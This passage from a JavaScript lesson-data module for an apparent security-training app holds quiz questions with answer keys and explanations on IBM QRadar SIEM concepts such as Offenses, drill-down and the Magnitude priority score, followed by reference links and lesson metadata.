          "label": "QRadar disables all filtering and drill-down, so once an Offense opens the analyst cannot narrow down to the specific events that caused it.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "QRadar's defining trait is that its rules correlate raw events/flows into Offenses scored by Magnitude, so the analyst starts at a prioritised incident queue and drills down — the opposite of a search-first tool that starts you at a blank query. Option a is wrong because QRadar's whole point is its correlation engine, and you can browse Log Activity without AQL. Option c is false because QRadar ingests both events (logs) and flows. Option d is wrong because Log Activity supports quick-filter, right-click, and AQL drill-down."
    },
    {
      "question": "An Offense in QRadar has a high Magnitude. What does Magnitude represent, and how should it shape your triage?",
      "options": [
        {
          "label": "The number of raw bytes in the offense's network flows, so you should investigate whichever offense transferred the most data regardless of its risk.",
          "value": "a"
        },
        {
          "label": "A priority score computed from severity, credibility, and relevance, so you work the Offense queue top-down by Magnitude, most urgent first.",
          "value": "b"
        },
        {
          "label": "The alphabetical order of the rule name that created it, so Magnitude simply determines where the offense appears in the list, not its importance.",
          "value": "c"
        },
        {
          "label": "The number of days the offense has been open, so a high Magnitude only means the offense is old and can safely be closed without review.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Magnitude is QRadar's priority score, combining severity (potential damage), credibility (confidence it is real), and relevance (importance of the affected asset), so analysts work the Offense queue top-down by Magnitude to hit the most urgent incidents first. Option a wrongly equates it with flow bytes. Option c invents an alphabetical scheme. Option d is dangerously wrong — high Magnitude signals urgency, not age or a reason to auto-close."
    }
  ],
  "references": [
    "https://www.ibm.com/docs/en/qradar-common?topic=overview-qradar-siem",
    "https://www.ibm.com/docs/en/qsip/latest?topic=queries-ariel-query-language",
    "https://www.ibm.com/docs/en/qsip/latest?topic=investigations-offenses"
  ],
  "xp": 240,
  "estimatedMinutes": 52,
  "researchUsed": false,
  "createdAt": "2026-08-16T00:00:00.000Z"
}
];

export default NEW_TOPIC_LESSONS;
export { NEW_TOPIC_LESSONS };
